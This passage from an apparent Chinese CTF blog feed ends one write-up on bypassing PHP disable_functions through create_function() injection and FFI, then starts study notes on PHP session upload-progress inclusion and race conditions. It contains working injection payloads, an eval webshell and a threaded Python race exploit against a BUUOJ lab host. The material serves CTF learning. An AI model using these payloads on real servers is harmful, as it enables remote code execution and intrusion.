&lt;p>这个形式，真的是一眼&lt;code>create_function()&lt;/code>了，看一下phpinfo()，用的还是&lt;code>create_function()&lt;/code>的注入&lt;/p>
&lt;pre tabindex="0">&lt;code>?fighter=create_function&amp;amp;fights=&amp;amp;invincibly=;}phpinfo();/*
&lt;/code>&lt;/pre>&lt;p>看下disable_function&lt;/p>
&lt;pre tabindex="0">&lt;code>system,exec,shell_exec,passthru,proc_open,proc_close,&amp;amp;nbsp;proc_get_status,checkdnsrr,getmxrr,getservbyname,getservbyport,&amp;amp;nbsp;syslog,popen,show_source,highlight_file,dl,socket_listen,socket_create,socket_bind,socket_accept,&amp;amp;nbsp;socket_connect,&amp;amp;nbsp;stream_socket_server,&amp;amp;nbsp;stream_socket_accept,stream_socket_client,ftp_connect,&amp;amp;nbsp;ftp_login,ftp_pasv,ftp_get,sys_getloadavg,disk_total_space,&amp;amp;nbsp;disk_free_space,posix_ctermid,posix_get_last_error,posix_getcwd,&amp;amp;nbsp;posix_getegid,posix_geteuid,posix_getgid,&amp;amp;nbsp;posix_getgrgid,posix_getgrnam,posix_getgroups,posix_getlogin,posix_getpgid,posix_getpgrp,posix_getpid,&amp;amp;nbsp;posix_getppid,posix_getpwnam,posix_getpwuid,&amp;amp;nbsp;posix_getrlimit,&amp;amp;nbsp;posix_getsid,posix_getuid,posix_isatty,&amp;amp;nbsp;posix_kill,posix_mkfifo,posix_setegid,posix_seteuid,posix_setgid,&amp;amp;nbsp;posix_setpgid,posix_setsid,posix_setuid,posix_strerror,posix_times,posix_ttyname,posix_uname&amp;lt;/td&amp;gt;&amp;lt;td class=&amp;#34;v&amp;#34;&amp;gt;system,exec,shell_exec,passthru,proc_open,proc_close,&amp;amp;nbsp;proc_get_status,checkdnsrr,getmxrr,getservbyname,getservbyport,&amp;amp;nbsp;syslog,popen,show_source,highlight_file,dl,socket_listen,socket_create,socket_bind,socket_accept,&amp;amp;nbsp;socket_connect,&amp;amp;nbsp;stream_socket_server,&amp;amp;nbsp;stream_socket_accept,stream_socket_client,ftp_connect,&amp;amp;nbsp;ftp_login,ftp_pasv,ftp_get,sys_getloadavg,disk_total_space,&amp;amp;nbsp;disk_free_space,posix_ctermid,posix_get_last_error,posix_getcwd,&amp;amp;nbsp;posix_getegid,posix_geteuid,posix_getgid,&amp;amp;nbsp;posix_getgrgid,posix_getgrnam,posix_getgroups,posix_getlogin,posix_getpgid,posix_getpgrp,posix_getpid,&amp;amp;nbsp;posix_getppid,posix_getpwnam,posix_getpwuid,&amp;amp;nbsp;posix_getrlimit,&amp;amp;nbsp;posix_getsid,posix_getuid,posix_isatty,&amp;amp;nbsp;posix_kill,posix_mkfifo,posix_setegid,posix_seteuid,posix_setgid,&amp;amp;nbsp;posix_setpgid,posix_setsid,posix_setuid,posix_strerror,posix_times,posix_ttyname,posix_uname
&lt;/code>&lt;/pre>&lt;p>直接不用看了，有一吨，肯定得绕过；蚁剑的各种插件都失败，得手动绕，ffi扩展开着&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204174245283.png" alt="image-20211204174245283">&lt;/p>
&lt;p>看到这里&lt;code>ffi.enable=On&lt;/code>，符合蚁剑插件的应用条件，写个webshell试试&lt;/p>
&lt;pre tabindex="0">&lt;code>?fighter=create_function&amp;amp;fights=&amp;amp;invincibly=;}eval($_POST[wuhu]);/*
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204175626714.png" alt="image-20211204175626714">&lt;/p>
&lt;p>what&amp;rsquo;s up，竟然没有回显&lt;/p>
&lt;p>尝试ping，发现还不出网，不能用curl外带flag&lt;/p>
&lt;p>那只能从FFI本身下手了，调用c的popen 用管道读命令执行的结果&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">FILE&lt;/span> &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#75af00">popen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span>&lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#111">command&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span>&lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#111">type&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>popen&lt;/code>会调用&lt;code>fork()&lt;/code>产生子进程，然后从子进程中调用&lt;code>/bin/sh -c&lt;/code>来执行参数的命令，type有r(read)和w(write)，依照这个值&lt;code>popen&lt;/code>会建立管道连接到子进程的标准输出设备或写入到子进程的标准输入设备中&lt;/p>
&lt;pre tabindex="0">&lt;code>?fighter=create_function&amp;amp;fights=&amp;amp;invincibly=;}$ffi = FFI::cdef(&amp;#34;void *popen(char*,char*);void pclose(void*);int fgetc(void*);&amp;#34;,&amp;#34;libc.so.6&amp;#34;);$o = $ffi-&amp;gt;popen(&amp;#34;ls / -lah&amp;#34;,&amp;#34;r&amp;#34;);$d = &amp;#34;&amp;#34;;while(($c = $ffi-&amp;gt;fgetc($o)) != -1){$d .= str_pad(strval(dechex($c)),2,&amp;#34;0&amp;#34;,0);}$ffi-&amp;gt;pclose($o);echo hex2bin($d);/*
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204180626497.png" alt="image-20211204180626497">&lt;/p>
&lt;p>另一种方法是调用php源码中的函数&lt;code>php_exec()&lt;/code>，当它的参数type为3时对应调用的是&lt;code>passthru()&lt;/code>函数，其执行命令可以将结果原始输出&lt;/p>
&lt;pre tabindex="0">&lt;code>?fighter=create_function&amp;amp;fights=&amp;amp;invincibly=;}$ffi = FFI::cdef(&amp;#34;int php_exec(int type, char *cmd);&amp;#34;);$ffi-&amp;gt;php_exec(3,&amp;#34;ls /&amp;#34;);/*
&lt;/code>&lt;/pre>&lt;p>但是，这道题在buu复现不了，原因是uuid有32个字符，加上连字符有36位，再加上flag{}有42位，但是/readflag程序只允许读出37个字符，所以最后的5位是读不出来的（辣个唯一解可能是爆破的 我试着爆了一会 加延时得跑好久好久好久 放弃了&lt;/p>
&lt;hr>
&lt;p>最近在刷buuoj，有望这个月内把50解以上的题做完捏&lt;/p>
&lt;hr>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
以下是本文中涉及到的 和我学习时看过的所有文章的链接🔗 每日感谢互联网的丰富资源（
&lt;/h4>
&lt;/summary>
&lt;p>&lt;a href="https://wiki.php.net/rfc/preload">PHP RFC: Preloading&lt;/a> | &lt;a href="https://wiki.php.net/rfc/ffi">PHP RFC: FFI - Foreign Function Interface&lt;/a> | &lt;a href="https://wiki.php.net/rfc/custom_object_serialization">PHP RFC: New custom object serialization mechanism&lt;/a> | &lt;a href="https://www.laruence.com/2020/03/11/5475.html">PHP FFI详解 - 一种全新的PHP扩展方式&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://towardsdatascience.com/do-you-hate-how-slow-python-is-this-is-how-you-can-make-it-run-faster-532468fe1583">Do You Hate How Slow Python Is? This Is How You Can Make It Run Faster!&lt;/a> | &lt;a href="https://towardsdatascience.com/make-python-faster-with-cffi-python-bindings-eb5402bc35dd">Make Python Faster with CFFI Python Bindings&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://cffi.readthedocs.io/en/latest/">CFFI documentation&lt;/a> | &lt;a href="https://docs.python.org/3/library/ctypes.html">ctypes documentation&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.cnblogs.com/ccxikka/p/9637545.html">Python cffi学习 &lt;/a> | &lt;a href="https://github.com/wolever/python-cffi-example">cffi-example: an example project showing how to use Python&amp;rsquo;s CFFI&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://mochazz.github.io/2019/05/21/RCTF2019Web%E9%A2%98%E8%A7%A3%E4%B9%8Bnextphp/#nextphp">wp&lt;/a> | &lt;a href="http://www.lshhaisheng.com/2021/08/02/%E7%BB%95%E8%BF%87disable_function/">wp2&lt;/a>&lt;/p>
&lt;/details></description></item><item><title>PHP_Session学习笔记</title><link>https://amiaaaz.github.io/2021/11/29/php-session-study-notes/</link><pubDate>Mon, 29 Nov 2021 22:23:42 +0800</pubDate><guid>https://amiaaaz.github.io/2021/11/29/php-session-study-notes/</guid><description>&lt;p>提到session，能想到什么捏？文件上传，条件竞争，session包含，反序列化…… 让我们一点点说&lt;/p>
&lt;hr>
&lt;h2 id="session配置简述">session配置&amp;amp;简述&lt;/h2>
&lt;p>以7.4.3为例，php.ini中关于Session有几个默认项&lt;/p>
&lt;ul>
&lt;li>
&lt;p>&lt;code>session.auto_start = 0&lt;/code>：默认不启动session，*但是可以在php脚本中手动执行&lt;code>session_start()&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>session.save_handler = files&lt;/code>：session以文件形式存储&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>session.save_path=&amp;quot;&amp;quot;&lt;/code>：session文件存储路径 文件名为&lt;code>sess_PHPSESSID&lt;/code>&lt;/p>
&lt;p>linux下默认存储位置；*可以被修改&lt;/p>
&lt;pre tabindex="0">&lt;code>/var/lib/php/sess_PHPSESSID
/var/lib/php/sessions/sess_PHPSESSID
/var/lib/php5/sess_PHPSESSID
/var/lib/php5/sessions/sess_PHPSESSID
/tmp/sess_PHPSESSID
/tmp/sessions/sess_PHPSESSID
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>&lt;code>session.serialize_handler = php&lt;/code>：session的默认序列化引擎是php&lt;/p>
&lt;p>其实一共有3种，*php和php_serialize这两种是很多题的元凶&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>序列化引擎&lt;/th>
&lt;th>存储方式&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>php&lt;/td>
&lt;td>键名|序列化后字符串&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>php_binary&lt;/td>
&lt;td>键名的长度对应的 ASCII 字符（会有不可显示的字符）+键名+经过 serialize() 函数反序列处理的值&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>php_serialize(php&amp;gt;=5.5.4)&lt;/td>
&lt;td>将字符串反序列化处理得到的数组&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;/li>
&lt;li>
&lt;p>&lt;code>session.upload_progress.enabled = On&lt;/code>：当有POST上传行为时，此次上传的详细信息（如上传时间、上传进度等）都会被存储到session中&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>session.upload_progress.cleanup = On&lt;/code>：当POST上传完成后，此次的session文件内容会被立即情况&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>session.upload_progress.prefix = &amp;quot;upload_progress_&amp;quot;&lt;/code>：存入session文件中的前缀部分&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>session.upload_progress.name = &amp;quot;PHP_SESSION_UPLOAD_PROGRESS&amp;quot;&lt;/code>：默认name，*可控可利用&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>session.use_strict_mode = 0&lt;/code>：表示我们对Cookie中的PHPSESSID字段可控&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h2 id="文件包含条件竞争">文件包含&amp;amp;条件竞争&lt;/h2>
&lt;p>默认情况下&lt;code>session.use_strict_mode = 0&lt;/code>，当我们设置了Cookie的&lt;code>PHPSESSID&lt;/code>字段后的值value后，php会自动创建session文件（默认路径&lt;code>/tmp/sess_PHPSESSID&lt;/code>）；注意这个行为并不需要&lt;code>session.auto_start = On&lt;/code>或是&lt;code>session_start()&lt;/code>来手动开启就会被PHP自动初始化一个session，并将prefix+value写入sess_PHPSESSID文件中；整个流程中value可控，我们可以把恶意的payload加载到sess文件中然后包含，得到rce&lt;/p>
&lt;p>这是一个常见的上传表单&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">form&lt;/span> &lt;span style="color:#75af00">action&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;index.php&amp;#34;&lt;/span> &lt;span style="color:#75af00">method&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;POST&amp;#34;&lt;/span> &lt;span style="color:#75af00">enctype&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;multipart/form-data&amp;#34;&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">input&lt;/span> &lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;hidden&amp;#34;&lt;/span> &lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;PHP_SESSION_UPLOAD_PROGRESS&amp;#34;&lt;/span> &lt;span style="color:#75af00">value&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;666666&amp;#34;&lt;/span> &lt;span style="color:#111">/&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">input&lt;/span> &lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;file&amp;#34;&lt;/span> &lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;file&amp;#34;&lt;/span> &lt;span style="color:#111">/&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">input&lt;/span> &lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;submit&amp;#34;&lt;/span> &lt;span style="color:#111">/&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">form&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>当然一般的题不会有这么单纯，还会配一个默认项&lt;code>session.upload_progress.cleanup = On&lt;/code>；但是如果我们构造上传表单时传的无用文件很大时就可以来个顶级拉扯（条件竞争），在它被清空前先包含&amp;amp;rce&lt;/p>
&lt;h3 id="wmctf2020make-php-great-again">[WMCTF2020]Make PHP Great Again&lt;/h3>
&lt;p>开幕源码暴击&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">require_once&lt;/span> &lt;span style="color:#d88200">&amp;#39;flag.php&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;file&amp;#39;&lt;/span>&lt;span style="color:#111">]))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">require_once&lt;/span> &lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;file&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这个题的非预期解：文件包含+条件竞争&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">io&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">threading&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">sessid&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;AMIZ&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#34;cmd&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;system(&amp;#39;tac /var/www/html/flag.php&amp;#39;);&amp;#34;&lt;/span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">write&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">io&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">BytesIO&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;a&amp;#39;&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">100&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">50&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://d5ef2f36-5be3-46d5-8c04-301b9ba4f5f7.node4.buuoj.cn:81/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#39;PHP_SESSION_UPLOAD_PROGRESS&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;lt;?php eval($_POST[&amp;#34;cmd&amp;#34;]);?&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#111">},&lt;/span> &lt;span style="color:#111">files&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#39;file&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;amiz.txt&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#111">)},&lt;/span> &lt;span style="color:#111">cookies&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#39;PHPSESSID&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">sessid&lt;/span>&lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">read&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">resp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://d5ef2f36-5be3-46d5-8c04-301b9ba4f5f7.node4.buuoj.cn:81/?file=/tmp/sess_&amp;#39;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">sessid&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#d88200">&amp;#39;amiz.txt&amp;#39;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">resp&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">resp&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">event&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">clear&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">pass&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">event&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">threading&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Event&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">30&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">threading&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Thread&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">target&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">write&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">,))&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">start&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">30&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">threading&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Thread&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">target&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">,))&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">start&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">event&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">set&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="hxb-2021easywill">[HXB 2021]easywill&lt;/h3>
&lt;p>willphp v2.1.5，是基于tp的框架&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">home\controller&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">IndexController&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">index&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
